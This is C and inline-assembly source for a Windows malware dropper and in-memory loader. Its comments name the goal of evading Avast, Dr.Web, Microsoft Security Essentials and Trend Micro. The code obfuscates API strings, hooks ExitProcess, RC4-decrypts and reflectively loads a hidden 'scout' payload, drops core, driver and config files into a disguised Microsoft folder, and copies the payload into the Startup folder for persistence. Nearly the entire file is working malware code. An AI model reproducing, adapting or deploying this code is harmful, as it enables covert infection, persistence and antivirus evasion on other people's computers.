#include <windows.h>
#include <Shlobj.h>
#include "DropperCode.h"
#include "depack.h"
#include "macro.h"
#include "reloc.h"

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment


typedef PWCHAR (__cdecl *MYCONF)(PULONG uWinMain);

typedef void (*ARCFOUR)(const unsigned char *key, 
	size_t keylen, 
	size_t skip,
	unsigned char *data, 
	size_t data_len, 
	PMY_DATA pData);


__forceinline ULONG ldr_exportdir(HMODULE hModule);
__forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData);


typedef struct base_relocation_block
{
	DWORD PageRVA;
	DWORD BlockSize;
} base_relocation_block_t;

typedef struct base_relocation_entry
{
	WORD offset : 12;
	WORD type : 4;
} base_relocation_entry_t;


int __stdcall DropperEntryPoint()
{
	DWORD dwCurrentAddr = 0;
	DWORD OEP = 0;
	
	// bypass AVAST emulation (SuspBehav-B static detection)
	for (int i = 0; i < 1000; i+=4)
		i -= 2;
	
	// Get current EIP in dwCurrentAddr
	__asm {
		call lbl_ref1
	lbl_ref1:
		pop dwCurrentAddr
	}

	// *** Find the ending marker of data section <E> - ASM because of Dr.Web :)
	while(1)
	{
		__asm
		{
			mov ecx, [dwCurrentAddr]
magicloop:
			sub ecx, 1
			mov edx, [ecx]
			mov ebx, edx
			and ebx, 0xffff0000
			and edx, 0x0000ffff

			cmp edx, 0x453c
			jne magicloop
			nop
			cmp ebx, 0x003e0000
			jne magicloop
			mov [dwCurrentAddr], ecx
			jmp endmagicloop
		}
	}
endmagicloop:

	// *** Total size of data section
	dwCurrentAddr -= sizeof(DWORD);
	DWORD dwDataSize = (DWORD)(*(DWORD*)(dwCurrentAddr));
	
	// *** Pointer to data section header
	DataSectionHeader *header = (DataSectionHeader*) (dwCurrentAddr - dwDataSize);

	// *** Resolve API
	LOADLIBRARY pfn_LoadLibrary = resolveLoadLibrary();
	GETPROCADDRESS pfn_GetProcAddress = resolveGetProcAddress();
	
	CHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 }; 
	CHAR strShlwapi[] = { 'S', 'h', 'l', 'w', 'a', 'p', 'i', 0x0 };
	CHAR strShell32[] = { 'S', 'h', 'e', 'l', 'l', '3', '2', 0x0 };
	CHAR strVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	CHAR strVirtualFree[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	CHAR strVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0 };
	CHAR strVirtualQuery[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'Q', 'u', 'e', 'r', 'y', 0x0 };
	CHAR strGetModuleFileName[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x0 };
	CHAR strGetModuleHandleA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
	CHAR strCreateThread[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };
	CHAR strExitProcess[] = { 'E', 'x', 'i', 't', 'P', 'r', 'o' , 'c', 'e', 's', 's', 0x0 };
	CHAR strGetEnvironmentVariableA[] = { 'G', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'A', 0x0 };
	CHAR strPathRemoveFileSpecA[] = { 'P', 'a', 't', 'h', 'R', 'e', 'm', 'o', 'v', 'e', 'F', 'i', 'l', 'e', 'S', 'p', 'e', 'c', 'A', 0x0 };
	CHAR strGetFileAttributesA[] = { 'G', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
	CHAR strSetFileAttributesA[] = { 'S', 'e', 't', 'F', 'i', 'l', 'e', 'A', 't', 't', 'r', 'i', 'b', 'u', 't', 'e', 's', 'A', 0x0 };
	CHAR strCreateDirectoryA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0 };
	CHAR strGetLastError[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0x0 };
	CHAR strSetCurrentDirectoryA[] = { 'S', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'D', 'i', 'r', 'e', 'c', 't', 'o', 'r', 'y', 'A', 0x0 };
	CHAR strCreateFileA[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'A', 0x0 };
	CHAR strCreateFileW[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'l', 'e', 'W', 0x0 };
	CHAR strWriteFile[] = { 'W', 'r', 'i', 't', 'e', 'F', 'i', 'l', 'e', 0x0 };
	CHAR strCloseHandle[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
	CHAR strSHGetSpecialFolderPathW[] = { 'S', 'H', 'G', 'e', 't', 'S', 'p', 'e', 'c', 'i', 'a', 'l', 'F', 'o', 'l', 'd', 'e', 'r', 'P', 'a', 't', 'h', 'W', 0x0 }; 
	CHAR strGetShortPathNameW[] = { 'G', 'e', 't', 'S', 'h', 'o', 'r', 't', 'P', 'a', 't', 'h', 'N', 'a', 'm', 'e', 'W', 0x0 };
	CHAR strPathAddBackslashW[] = { 'P', 'a', 't', 'h', 'A', 'd', 'd', 'B', 'a', 'c', 'k', 's', 'l', 'a', 's', 'h', 'W', 0x0 };
	CHAR strPathAppendW[] = { 'P', 'a', 't', 'h', 'A', 'p', 'p', 'e', 'n', 'd', 'W', 0x0 };
	CHAR strExitThread[] = { 'E', 'x', 'i', 't', 'T', 'h', 'r', 'e', 'a', 'd', 0x0 };

	VIRTUALALLOC pfn_VirtualAlloc = (VIRTUALALLOC) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualAlloc);
	VIRTUALFREE pfn_VirtualFree = (VIRTUALFREE) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualFree);
	VIRTUALPROTECT pfn_VirtualProtect = (VIRTUALPROTECT) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualProtect);
	GETMODULEFILENAME pfn_GetModuleFileNameA = (GETMODULEFILENAME) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetModuleFileName);
	GETMODULEHANDLE pfn_GetModuleHandleA = (GETMODULEHANDLE) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetModuleHandleA);
	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strVirtualQuery);
	CREATETHREAD pfn_CreateThread = (CREATETHREAD) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateThread);
	GETENVIRONMENTVARIABLE pfn_GetEnvironmentVariableA = (GETENVIRONMENTVARIABLE) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetEnvironmentVariableA);
	PATHREMOVEFILESPEC pfn_PathRemoveFileSpecA = (PATHREMOVEFILESPEC) pfn_GetProcAddress(pfn_LoadLibrary(strShlwapi), strPathRemoveFileSpecA);
	GETFILEATTRIBUTESA pfn_GetFileAttributesA = (GETFILEATTRIBUTESA) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetFileAttributesA);
	SETFILEATTRIBUTESA pfn_SetFileAttributesA = (SETFILEATTRIBUTESA) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strSetFileAttributesA);
	CREATEDIRECTORY pfn_CreateDirectoryA = (CREATEDIRECTORY) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateDirectoryA);
	GETLASTERROR pfn_GetLastError = (GETLASTERROR) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetLastError);
	SETCURRENTDIRECTORY pfn_SetCurrentDirectoryA = (SETCURRENTDIRECTORY) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strSetCurrentDirectoryA);
	CREATEFILEA pfn_CreateFileA = (CREATEFILEA) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateFileA);
	CREATEFILEW pfn_CreateFileW = (CREATEFILEW) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCreateFileW);
	WRITEFILE pfn_WriteFile = (WRITEFILE) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strWriteFile);
	CLOSEHANDLE pfn_CloseHandle = (CLOSEHANDLE) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strCloseHandle);
	SHGETFOLDERW pfn_SHGetSpecialFolderPathW = (SHGETFOLDERW) pfn_GetProcAddress(pfn_LoadLibrary(strShell32), strSHGetSpecialFolderPathW);
	GETSHORTPATHNAMEW pfn_GetShortPathNameW = (GETSHORTPATHNAMEW) pfn_GetProcAddress(pfn_LoadLibrary(strKernel32), strGetShortPathNameW);
	PATHADDBACKSLASHW pfn_PathAddBackslashW = (PATHADDBACKSLASHW) pfn_GetProcAddress(pfn_LoadLibrary(strShlwapi), strPathAddBackslashW);
	PATHAPPENDW pfn_PathAppendW = (PATHAPPENDW) pfn_GetProcAddress(pfn_LoadLibrary(strShlwapi), strPathAppendW);

	PMY_DATA pData = (PMY_DATA) pfn_VirtualAlloc(NULL, sizeof(MY_DATA), MEM_COMMIT, PAGE_READWRITE);
	pData->LoadLibraryA = pfn_LoadLibrary;
	pData->GetProcAddress = pfn_GetProcAddress;
	pData->VirtualAlloc = pfn_VirtualAlloc;
	pData->VirtualFree = pfn_VirtualFree;
	pData->VirtualProtect = pfn_VirtualProtect;
	pData->VirtualQuery = pfn_VirtualQuery;
	pData->GetModuleFileNameA = pfn_GetModuleFileNameA;
	pData->GetModuleHandleA = pfn_GetModuleHandleA;
	pData->CreateThread = pfn_CreateThread;
	pData->GetEnvironmentVariableA = pfn_GetEnvironmentVariableA;
	pData->PathRemoveFileSpecA = pfn_PathRemoveFileSpecA;
	pData->GetFileAttributesA = pfn_GetFileAttributesA;
	pData->CreateDirectoryA = pfn_CreateDirectoryA;
	pData->GetLastError = pfn_GetLastError;
	pData->SetCurrentDirectoryA = pfn_SetCurrentDirectoryA;
	pData->PathRemoveFileSpecA = pfn_PathRemoveFileSpecA;
	pData->SetFileAttributesA = pfn_SetFileAttributesA;
	pData->CreateFileA = pfn_CreateFileA;
	pData->CreateFileW = pfn_CreateFileW;
	pData->WriteFile = pfn_WriteFile;
	pData->CloseHandle = pfn_CloseHandle;
	pData->SHGetSpecialFolderPathW = pfn_SHGetSpecialFolderPathW;
	pData->GetShortPathNameW = pfn_GetShortPathNameW;
	pData->PathAddBackslashW = pfn_PathAddBackslashW;
	pData->PathAppendW = pfn_PathAppendW;

	pData->header = header;
	// *** Resolve API END

	// *** Check for Microsoft Security Essential emulation 
	LPSTR fName = (LPSTR)pData->VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	pData->GetModuleFileNameA(NULL, fName, MAX_PATH);
	DWORD prgLen = _STRLEN_(fName);
	// x86
	char x86MspEng[26] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'S', 'e', 'c', 'u', 'r' ,'i', 't', 'y', ' ', 'C', 'l', 'i', 'e', 'n', 't', 0x0 };
	for(DWORD i=0; i<prgLen; i++)
		if(!_STRCMP_(fName+i, x86MspEng))
			goto OEP_CALL;
	// x64
	char x64MspEng[12] = { ':', '\\', 'm', 'y', 'a', 'p', 'p', '.', 'e', 'x', 'e', 0x0 };
	if(!_STRCMP_(&fName[1], x64MspEng))
		goto OEP_CALL;
	pData->VirtualFree(fName, 0, MEM_RELEASE);
	// *** MSE emulation END


	// FIX INSTALLERS & STUFF
	FixInstallers(pData);
	//
	
	// *** Hook ExitProcess the lame way

	ULONG uOldProtect;

	MEMORY_BASIC_INFORMATION mbi;
	ULONG uHookAddress = (ULONG)((PBYTE)header + header->functions.exitProcessHook.offset);
	LPVOID pBaseAddress = pData->GetModuleHandleA(NULL);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBaseAddress;
	PIMAGE_NT_HEADERS32 pNtHeaders = (PIMAGE_NT_HEADERS32) (((PBYTE)pDosHeader) + pDosHeader->e_lfanew);

	HOOKIAT pfn_HookIAT = (HOOKIAT) (((PCHAR)header) + header->functions.hookIAT.offset);
	pfn_HookIAT(strKernel32,
		strExitProcess, 
		//(DWORD)pExitProcessAddr, 
		(DWORD)uHookAddress,
		pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
		(DWORD)pBaseAddress,
		pData);

		
	// this is used to notify the ExitProcess hook that we can exit the process,
	// so it must be writable
	pfn_VirtualProtect(&header->synchro, 4096, PAGE_READWRITE, &uOldProtect);

	// this is used to hold the dll path for CoreThreadProc
	pfn_VirtualProtect(&header->dllPath, 4096, PAGE_READWRITE, &uOldProtect);

	if (header->isScout)
	{
		// extract scout 
		PBYTE pPackedScoutBuffer = (PBYTE)pData->VirtualAlloc(NULL, header->files.core.size, MEM_COMMIT, PAGE_READWRITE);
		_MEMCPY_(pPackedScoutBuffer, (PBYTE)header + header->files.core.offset, header->files.core.size);

		ARCFOUR pfn_rc4skip = (ARCFOUR) (((char*)header) + header->functions.rc4.offset);
		pfn_rc4skip((PBYTE)header->rc4key, 64, 0, pPackedScoutBuffer, header->files.core.size, pData);

		PBYTE pScoutBuffer = (PBYTE) pData->VirtualAlloc(NULL, header->files.core.original_size, MEM_COMMIT, PAGE_READWRITE);
		if (aP_depack(pPackedScoutBuffer, pScoutBuffer) != header->files.core.original_size)
			goto OEP_RESTORE;
		pData->VirtualFree(pPackedScoutBuffer, 0, MEM_RELEASE);

		// ** save buffer & size
		pData->pScoutBuffer = pScoutBuffer;
		pData->pScoutSize = header->files.core.original_size;

		// *** start the scout
		HANDLE hThread = pData->CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ((PBYTE)header + header->functions.load.offset), pData, 0, NULL);
	}
	else
	{
		CHAR pSep[] = { '\\', 0x0 };
		CHAR pTmp[] = { 'T', 'M', 'P', 0x0};
		CHAR pSubDir[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', 0x0 };

		LPSTR pTmpDir = (LPSTR)pData->VirtualAlloc(NULL, 32767, MEM_COMMIT, PAGE_READWRITE);
		_ZEROMEM_(pTmpDir, 32767);

		pData->GetEnvironmentVariableA(pTmp, pTmpDir, MAX_PATH);
		pData->PathRemoveFileSpecA(pTmpDir);

		_STRCAT_(pTmpDir, pSep);
		_STRCAT_(pTmpDir, pSubDir);

		/* check if subdir Microsoft exists if not, then create it. */
		DWORD FileAttributes = pData->GetFileAttributesA(pTmpDir);
		if (FileAttributes == INVALID_FILE_ATTRIBUTES || !(FileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			DWORD bRet = pData->CreateDirectoryA(pTmpDir, NULL);
			if (!bRet)
				if (pData->GetLastError() != ERROR_ALREADY_EXISTS) // non-sense but.. whatever.
				{
					pData->VirtualFree(pTmpDir, 0, MEM_RELEASE);
					goto OEP_RESTORE;
				}
		}

		//FIXME: get short name!!
		_STRCAT_(pTmpDir, pSep);
		_STRCAT_(pTmpDir, pData->header->instDir);
		_STRCAT_(pTmpDir, pSep);

		BOOL bRet = pData->CreateDirectoryA(pTmpDir, NULL);
		if (!bRet)
		{
			if (pData->GetLastError() != ERROR_ALREADY_EXISTS)
			{
				pData->VirtualFree(pTmpDir, 0, MEM_RELEASE);
				goto OEP_RESTORE;
			}
		}

		pData->SetCurrentDirectoryA(pTmpDir);
		_STRCAT_(pTmpDir, (PCHAR)(((PCHAR)header) + header->files.names.core.offset));
		pData->header->dllPath = pTmpDir;


		DUMPFILE pfn_DumpFile = (DUMPFILE) (((PCHAR)header) + header->functions.dumpFile.offset);

		// CORE
		if (header->files.core.offset != 0 && header->files.core.size != 0) 
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.core.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.core.offset);

			DWORD size = header->files.core.size;
			DWORD originalSize = header->files.core.original_size;

			BOOL ret = pfn_DumpFile(fileName, (PCHAR)fileData, size, originalSize, pData);
			if (ret == FALSE)
				goto OEP_RESTORE;
		}
		else
			goto OEP_RESTORE;

		// CORE (64 bit)
		if (header->files.core64.offset != 0 && header->files.core64.size != 0)
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.core64.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.core64.offset);
			DWORD size = header->files.core64.size;
			DWORD originalSize = header->files.core64.original_size;

			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
		}

		// CONFIG
		if (header->files.config.offset != 0 && header->files.config.size != 0)
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.config.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.config.offset);
			DWORD size = header->files.config.size;
			DWORD originalSize = header->files.config.original_size;

			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
			if (ret == FALSE)
				goto OEP_RESTORE;
		}

		// DRIVER
		if (header->files.driver.offset != 0 && header->files.driver.size != 0)
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.driver.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.driver.offset);
			DWORD size = header->files.driver.size;
			DWORD originalSize = header->files.driver.original_size;

			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
		}

		// DRIVER (64 bit)
		if (header->files.driver64.offset != 0 && header->files.driver64.size != 0)
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.driver64.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.driver64.offset);
			DWORD size = header->files.driver64.size;
			DWORD originalSize = header->files.driver64.original_size;

			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
		}

		// CODEC
		if (header->files.codec.offset != 0 && header->files.codec.size != 0)
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.codec.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.codec.offset);
			DWORD size = header->files.codec.size;
			DWORD originalSize = header->files.codec.original_size;

			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
		}

/*
		// BITMAP(DEMO)
		if (header->files.bitmap.offset != 0 && header->files.bitmap.size != 0)
		{
			PCHAR fileName = (PCHAR) (((PCHAR)header) + header->files.names.bitmap.offset);
			PCHAR fileData = (PCHAR) (((PCHAR)header) + header->files.bitmap.offset);
			DWORD size = header->files.bitmap.size;
			DWORD originalSize = header->files.bitmap.original_size;

			BOOL ret = pfn_DumpFile(fileName, fileData, size, originalSize, pData);
		}
*/

		DWORD oldProtect;
		THREADPROC pfn_CoreThreadProc = (THREADPROC)(((char*)header) + header->functions.coreThread.offset); 
		pData->VirtualProtect(pfn_CoreThreadProc, (UINT_PTR)CoreThreadProc_End - (UINT_PTR)CoreThreadProc, PAGE_EXECUTE_READWRITE, &oldProtect);

		pfn_CreateThread(NULL, 0, pfn_CoreThreadProc, pData, 0, NULL);
	}

OEP_RESTORE:
	// *** restore the original code
	if (header->stage1.size) 
	{
		PBYTE pCode = (PBYTE) (((PBYTE)header) + header->stage1.offset);
		size_t size = header->stage1.size;

		DWORD oldProtect;
		pData->VirtualProtect((LPVOID)header->stage1.VA, header->stage1.size, PAGE_EXECUTE_READWRITE, &oldProtect);
		_MEMCPY_((LPVOID)header->stage1.VA, pCode, size);
		pData->VirtualProtect((LPVOID)header->stage1.VA, header->stage1.size, oldProtect, &oldProtect);
	}

	return TRUE;

OEP_CALL:
	return FALSE;
}
FUNCTION_END(DropperEntryPoint);

LPVOID WINAPI MemoryLoader(LPVOID pDataBuffer)
{
	ULONG uSize;
	LPVOID lpRawBuffer;
	DWORD header_size = 0;
	LPVOID lpAddress = NULL;
	IMAGE_DOS_HEADER dos_header;
	IMAGE_NT_HEADERS32 pe_header;
	PMY_DATA pData = (PMY_DATA)pDataBuffer;
	

	_MEMSET_(&dos_header, 0x0, sizeof(dos_header));
	_MEMSET_(&pe_header, 0x0, sizeof(dos_header));

	lpRawBuffer = pData->pScoutBuffer;
	uSize = pData->pScoutSize;

	if (lpRawBuffer != NULL)
	{
		_MEMCPY_(&dos_header, lpRawBuffer, sizeof(dos_header));
		if (dos_header.e_magic != IMAGE_DOS_SIGNATURE || dos_header.e_lfanew == 0)
			return lpAddress;

		_MEMCPY_(&pe_header, CALC_OFFSET(LPVOID, lpRawBuffer, dos_header.e_lfanew), sizeof(pe_header));
		if (pe_header.Signature != IMAGE_NT_SIGNATURE)
			return lpAddress;

		lpAddress = pData->VirtualAlloc(NULL, pe_header.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
		if (lpAddress == NULL)
			return lpAddress;

		header_size = dos_header.e_lfanew + 
			pe_header.FileHeader.SizeOfOptionalHeader + 
			sizeof(pe_header.FileHeader) + 4;

		IMAGE_SECTION_HEADER section;
		LPVOID lpBufferPtr = CALC_OFFSET(LPVOID, lpRawBuffer, header_size);
		_MEMCPY_(&section, lpBufferPtr, sizeof(section));
		
		_MEMCPY_(lpAddress, lpRawBuffer, section.PointerToRawData);
		PIMAGE_SECTION_HEADER sections = CALC_OFFSET(PIMAGE_SECTION_HEADER, lpAddress, header_size);
		for(USHORT i = 0; i < pe_header.FileHeader.NumberOfSections; i++, sections++)
		{
			LPVOID lpSectionBuffer = CALC_OFFSET(LPVOID, lpAddress, sections->VirtualAddress);
			_MEMCPY_(lpSectionBuffer, CALC_OFFSET(LPVOID, lpRawBuffer, sections->PointerToRawData), sections->SizeOfRawData);
		}
	}

	DWORD ignore = 0;
	ldr_reloc(lpAddress, &pe_header);
	ldr_importdir((HMODULE) lpAddress, &pe_header, pData);

	MYCONF MyConf = (MYCONF)ldr_exportdir((HMODULE) lpAddress);

	PIMAGE_SECTION_HEADER sections = CALC_OFFSET(PIMAGE_SECTION_HEADER, lpAddress, header_size);	
	for(USHORT i = 0; i < pe_header.FileHeader.NumberOfSections; i++, sections++)
	{
		LPVOID lpSectionBuffer = CALC_OFFSET(LPVOID, lpAddress, sections->VirtualAddress);
		if ((sections->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE)
			pData->VirtualProtect(lpSectionBuffer, sections->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &ignore);
	}
	pData->VirtualProtect(lpAddress, header_size, PAGE_READONLY, &ignore);


	// questo comunica allo scout che sta girando in un meltato e gli passa
	// un puntatore a synchro che viene usata dalla hook di ExitProcess per sapere
	// quando si puo' uscire
	MAIN ptrMain = (MAIN)CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint); // greetz to cod and busatt.
	
	ptrMain((HINSTANCE)0xf1c4babe, NULL, "", 0xa);
	PWCHAR pScoutName = MyConf(&pData->header->synchro);	

	// drop scout into startup folder
	PWCHAR pTempStartupPath = (PWCHAR)pData->VirtualAlloc(NULL, 32767 * sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	pData->SHGetSpecialFolderPathW(NULL, pTempStartupPath, CSIDL_STARTUP, TRUE);

	PWCHAR pStartupPath = (PWCHAR)pData->VirtualAlloc(NULL, 32767 * sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	pData->GetShortPathNameW(pTempStartupPath, pStartupPath, 32767);
	pData->VirtualFree(pTempStartupPath, 0, MEM_RELEASE);

	ULONG uScoutNameLen = _STRLENW_(pScoutName);
	WCHAR strExe[] = { L'.', L'e', L'x', L'e', L'\0' };
	PWCHAR pExeName = (PWCHAR) pData->VirtualAlloc(NULL, 32767 * sizeof(WCHAR), MEM_COMMIT, PAGE_READWRITE);

	_MEMCPY_(pExeName, pScoutName, uScoutNameLen);
	_MEMCPY_(((PBYTE)pExeName) + uScoutNameLen, strExe, _STRLENW_(strExe));

	pData->PathAddBackslashW(pStartupPath);
	pData->PathAppendW(pStartupPath, pExeName);
	
	HANDLE hFile = pData->CreateFileW(pStartupPath, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile)
	{
		ULONG uWritten = 0;
		pData->WriteFile(hFile, lpRawBuffer, uSize, &uWritten, NULL);
		//pData->CloseHandle(hFile); //  Non chiude l' handle cosi' Trendmicro nn s'incazza
	}
	pData->VirtualFree(pStartupPath, 0, MEM_RELEASE);
	
	// MAIN MAIN
	
	ptrMain((HINSTANCE)lpAddress, NULL, "", 0xa);


	// not reached	
	return CALC_OFFSET(LPVOID, lpAddress, pe_header.OptionalHeader.AddressOfEntryPoint);
}
FUNCTION_END(MemoryLoader);

/*
__forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData)
{
	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
	DWORD dwIatAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	// no import directory here!
	if (dwIatAddr == 0)
		return;

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = CALC_OFFSET(PIMAGE_IMPORT_DESCRIPTOR, pModule, dwIatAddr);

	while(pImportDescriptor)
	{
		if (pImportDescriptor->FirstThunk == 0)
		{
			pImportDescriptor = NULL;
			continue;
		}

		LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, pModule, pImportDescriptor->FirstThunk);
		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule, pImportDescriptor->Name);	
		HMODULE hMod = pData->LoadLibraryA(lpModName);

		if (hMod != NULL)
			while(*pImportLookupTable != 0x00)
			{
				if ((*pImportLookupTable & IMAGE_ORDINAL_FLAG) != 0x00)
				{
					DWORD pOrdinalValue = *(CALC_OFFSET(LPDWORD, pImportLookupTable, 0)) & 0x0000ffff;
					*pImportLookupTable = (DWORD) pData->GetProcAddress(hMod, (LPCSTR) pOrdinalValue);
				}
				else
				{
					LPCSTR lpProcName = CALC_OFFSET_DISP(LPCSTR, pModule, (*pImportLookupTable), 2);	// adding two bytes
					*pImportLookupTable = (DWORD) pData->GetProcAddress(hMod, lpProcName);
				}
				pImportLookupTable++;		
			}
		pImportDescriptor++;
	}
}
*/
__forceinline void ldr_importdir(LPVOID pModule, PIMAGE_NT_HEADERS pImageNtHeader, PMY_DATA pData)
{
	DWORD dwIatSize = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
	DWORD dwIatAddr = pImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	// no import directory here!
	if (dwIatAddr == 0)
		return;

	PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = CALC_OFFSET(PIMAGE_IMPORT_DESCRIPTOR, pModule, dwIatAddr);

	while(pImportDescriptor->Characteristics != 0)
	{
		LPDWORD pImportLookupTable = CALC_OFFSET(LPDWORD, pModule, pImportDescriptor->Characteristics);
		LPDWORD pIATRVA = CALC_OFFSET(LPDWORD, pModule,	pImportDescriptor->FirstThunk);

		LPCSTR lpModName = CALC_OFFSET(LPCSTR, pModule,	pImportDescriptor->Name);

		HMODULE hMod = pData->LoadLibraryA(lpModName);

		if (hMod != NULL)
			while(*pImportLookupTable != 0x00)
			{
				if ((*pImportLookupTable & IMAGE_ORDINAL_FLAG) != 0x00)
				{
					DWORD pOrdinalValue = *pImportLookupTable & 0x0ffff;
					*pIATRVA = (DWORD) pData->GetProcAddress(hMod, (LPCSTR) pOrdinalValue);
				}
				else
				{
					LPCSTR lpProcName = CALC_OFFSET_DISP(LPCSTR, pModule, (*pImportLookupTable), 2);    // adding two bytes
					*pIATRVA = (DWORD) pData->GetProcAddress(hMod, lpProcName);
				}
				pIATRVA++;
				pImportLookupTable++;        
			}
			pImportDescriptor++;
	}
}


__forceinline ULONG ldr_exportdir(HMODULE hModule)
{
	ULONG pFunction = NULL;
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) hModule;
	PIMAGE_NT_HEADERS pImageNtHeaders = CALC_OFFSET(PIMAGE_NT_HEADERS, hModule, pImageDosHeader->e_lfanew);
	PIMAGE_DATA_DIRECTORY pExportDir = &pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	if (pExportDir->Size == 0 || pExportDir->VirtualAddress == 0)
		return pFunction;
	
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE)pExportDir->VirtualAddress + (ULONG)hModule);
	pExportDirectory->AddressOfNames += DWORD(hModule);
	pExportDirectory->AddressOfFunctions += DWORD(hModule);
	pExportDirectory->AddressOfNameOrdinals += DWORD(hModule);

	LPDWORD ptrFunctions = (LPDWORD) pExportDirectory->AddressOfFunctions;
	LPDWORD ptrNames = (LPDWORD) pExportDirectory->AddressOfNames;
